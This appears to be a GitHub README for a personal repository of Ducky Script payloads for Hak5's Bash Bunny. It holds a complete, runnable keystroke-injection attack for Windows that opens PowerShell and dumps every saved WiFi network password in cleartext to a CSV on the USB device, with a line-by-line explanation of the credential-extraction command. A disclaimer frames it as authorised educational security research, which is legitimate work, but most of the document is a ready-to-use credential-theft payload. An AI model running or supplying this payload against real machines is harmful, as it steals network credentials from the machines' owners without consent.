# Steven's Custom Ducky Script Repository

This repository contains **custom Ducky Scripts** designed for use with **Hak5's Bash Bunny**. 



## ⚠ Disclaimer

```
All projects and demonstrations in this portfolio are for educational and ethical cybersecurity research only. Every
technique and tool was used legally within approved environments, adhering to ethical hacking principles, legal
regulations, and responsible disclosure practices. Unauthorized use of these methods on systems without explicit
permission is illegal and strictly discouraged. Always follow legal guidelines and obtain proper authorization
before conducting security assessments.
```

<p align="center">
  <a href="https://hak5.org/" target="_blank">
    <img width="765" height="562" alt="bash" src="https://github.com/user-attachments/assets/2b00e903-8879-44b6-9343-6c249a14a5db" />
  </a>
</p>



## 🐇 Bash Bunny Network Key Dumper to CSV (Windows) 
**Payload.txt handles overall attack logic, device modes, and script execution.**
```ducky
# set up payload
LED SETUP
GET SWITCH_POSITION
ATTACKMODE HID STORAGE

# run duckyscript file 'ducky-script.txt'
LED STAGE1
QUACK ${SWITCH_POSITION}/ducky-script.txt

# end payload
LED FINISH
```

**Ducky-script.txt contains keystroke injection commands (Ducky Script syntax).**
```ducky
# opens the run dialog and waits 500 milliseconds to ensure the run dialog is open
GUI r
DELAY 500

# launches powershell without loading a user profile and waits 500 milliseconds
STRING powershell -NoProfile 
ENTER
DELAY 500

# navigates to the Bash Bunny's USB storage assuming it's labeled BashBunny
STRING $u=gwmi Win32_Volume|?{$_.Label -eq'BashBunny'}|select name;cd $u.name
ENTER
DELAY 500

# navigates to the loot directory where extracted data will be stored and waits 500 milliseconds
STRING cd loot
ENTER
DELAY 500

# extract WiFi profiles and passwords and saves to a CSV file in loot
STRING (netsh wlan show profiles) | Select-String ":(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -NoTypeInformation -Path ".\$env:UserName`_WiFiPasswords.csv"; exit
ENTER

```
**Explanation of the PowerShell command:**
```
1. `netsh wlan show profiles` – Lists all saved WiFi profiles.
2. `Select-String ":(.+)$"` – Extracts profile names using regex.
3. `netsh wlan show profile name="$name" key=clear` – Retrieves the password for each profile.
4. `Select-String "Key Content\W+\:(.+)$"` – Extracts the WiFi password using regex.
5. `[PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }` – Formats the data into objects.
6. `Export-Csv -NoTypeInformation -Path ".\$env:UserName`_WiFiPasswords.csv"` – Saves the extracted credentials as a CSV file.
7. `exit` – Closes PowerShell.
```



## 🔗 References

- [Hak5 Official Website](https://hak5.org/)
- [Bash Bunny Documentation](https://docs.hak5.org/bash-bunny/)

